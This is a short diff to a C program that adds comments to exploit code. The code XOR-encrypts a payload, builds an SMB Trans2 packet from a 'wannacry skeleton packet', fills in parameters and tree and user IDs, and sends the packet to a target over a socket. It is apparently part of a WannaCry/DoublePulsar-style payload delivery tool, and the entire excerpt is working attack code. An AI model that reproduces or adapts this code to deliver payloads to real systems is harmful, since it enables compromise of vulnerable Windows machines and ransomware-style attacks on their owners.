@@ -289,16 +289,19 @@ int main(int argc, char* argv[])
 	//Xor the data buffer with the calculated key
 	xor_payload(XorKey, (unsigned char*)encrypted, 4096);
 
+	//allocate memory for the big packet
 	unsigned char* big_packet = (unsigned char*)malloc(4178);
 	memset((unsigned char*)big_packet, 0x00, 4178);
 
 	//copy wannacry skeleton packet to big Trans2 packet
 	memcpy((unsigned char*)big_packet, (char*)wannacry_Trans2_Request, 70);
 
+	//copy XOR values to parameters buffer
 	memcpy(Parametersbuffer, (char*)&TotalSizeOfPayload, 4);
 	memcpy(Parametersbuffer + 4, (char*)&ChunkSize, 4);
 	memcpy(Parametersbuffer + 8, (char*)&OffsetofChunkinPayload, 4);
 
+	//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
 	memcpy((unsigned char*)big_packet + 70, (char*)Parametersbuffer, 12);
 
 	//copy encrypted payload
@@ -308,6 +311,7 @@ int main(int argc, char* argv[])
 	memcpy((unsigned char*)big_packet + 28, (char*)&treeid, 2);
 	memcpy((unsigned char*)big_packet + 32, (char*)&userid, 2);
 
+	//send the payload
 	send(sock, (char*)big_packet, 4178, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
